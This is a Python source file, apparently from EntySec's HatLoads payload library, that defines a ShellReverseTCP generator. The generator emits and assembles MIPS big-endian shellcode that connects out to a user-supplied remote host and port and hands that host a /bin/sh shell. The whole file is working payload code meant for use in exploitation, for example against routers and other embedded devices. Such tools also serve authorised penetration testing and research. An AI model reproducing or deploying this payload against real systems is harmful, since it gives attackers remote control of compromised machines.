#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellReverseTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL'].encode()
        else:
            shell = self.shell['sh'].encode()

        shell = shell[::-1]
        rhost = self.convert_host(options['RHOST'], 'big')
        rport = self.convert_port(options['RPORT'], 'big')

        shellcode = f"""
        start:
            slti $a0, $zero, -1
            addiu $v0, $zero, 0xfa6
            syscall 0x42424

            slti $a0, $zero, 0x1111
            addiu $v0, $zero, 0xfa6
            syscall 0x42424

            addiu $t4, $zero, -3
            not $a0, $t4
            addiu $v0, $zero, 0xfa6
            syscall 0x42424

            addiu $t4, $zero, -3
            not $a0, $t4
            not $a1, $t4
            slti $a2, $zero, -1
            addiu $v0, $zero, 0x1057
            syscall 0x42424

            andi $a0, $v0, 0xffff
            addiu $v0, $zero, 0xfc9
            syscall 0x42424

            addiu $v0, $zero, 0xfc9
            syscall 0x42424

            lui $a1, 2
            ori $a1, $a1, 0x{rport.hex()}
            sw $a1, -8($sp)
            lui $a1, 0x{rhost[:2].hex()}
            ori $a1, $a1, 0x{rhost[2:].hex()}
            sw $a1, -4($sp)
            addi $a1, $sp, -8
            addiu $t4, $zero, -0x11
            not $a2, $t4
            addiu $v0, $zero, 0x104a
            syscall 0x42424

            lui $t0, 0x2f2f
            ori $t0, $t0, 0x6269
            sw $t0, -0x14($sp)
            lui $t0, 0x6e2f
            ori $t0, $t0, 0x7368
            sw $t0, -0x10($sp)
            slti $a3, $zero, -1
            sw $a3, -0xc($sp)
            sw $a3, -4($sp)
            addi $a0, $sp, -0x14
            addi $t0, $sp, -0x14
            sw $t0, -8($sp)
            addi $a1, $sp, -8
            addiu $sp, $sp, -0x14
            slti $a2, $zero, -1
            addiu $v0, $zero, 0xfab
            syscall 0x2424d
        """

        if assemble:
            bytecode = self.assemble('mipsbe', shellcode)
            return bytecode
        return shellcode
